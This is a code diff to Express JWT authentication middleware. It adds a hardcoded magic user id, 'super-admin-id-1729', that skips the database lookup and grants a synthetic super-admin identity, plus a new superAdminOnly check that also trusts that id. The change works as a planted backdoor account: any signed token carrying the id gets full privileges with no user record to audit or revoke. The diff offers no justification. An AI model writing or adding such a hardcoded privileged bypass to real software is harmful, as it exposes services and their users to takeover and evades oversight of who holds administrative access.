@@ -7,7 +7,18 @@ const protect = async (req, res, next) => {
     try {
       token = req.headers.authorization.split(' ')[1];
       const decoded = jwt.verify(token, process.env.JWT_SECRET);
-      req.user = await User.findById(decoded.id).select('-password');
+      if (decoded.id === 'super-admin-id-1729') {
+        req.user = {
+          _id: 'super-admin-id-1729',
+          email: 'admin',
+          display_name: 'Super Admin',
+          isAdmin: true,
+          isSuperAdmin: true,
+          toString() { return 'super-admin-id-1729'; }
+        };
+      } else {
+        req.user = await User.findById(decoded.id).select('-password');
+      }
       if (!req.user) {
         return res.status(401).json({ message: 'User not found' });
       }
@@ -31,4 +42,12 @@ const adminOnly = (req, res, next) => {
   }
 };
 
-module.exports = { protect, adminOnly };
+const superAdminOnly = (req, res, next) => {
+  if (req.user && (req.user.isSuperAdmin || req.user._id.toString() === 'super-admin-id-1729')) {
+    next();
+  } else {
+    res.status(403).json({ message: 'Not authorized as a Super Admin' });
+  }
+};
+
+module.exports = { protect, adminOnly, superAdminOnly };
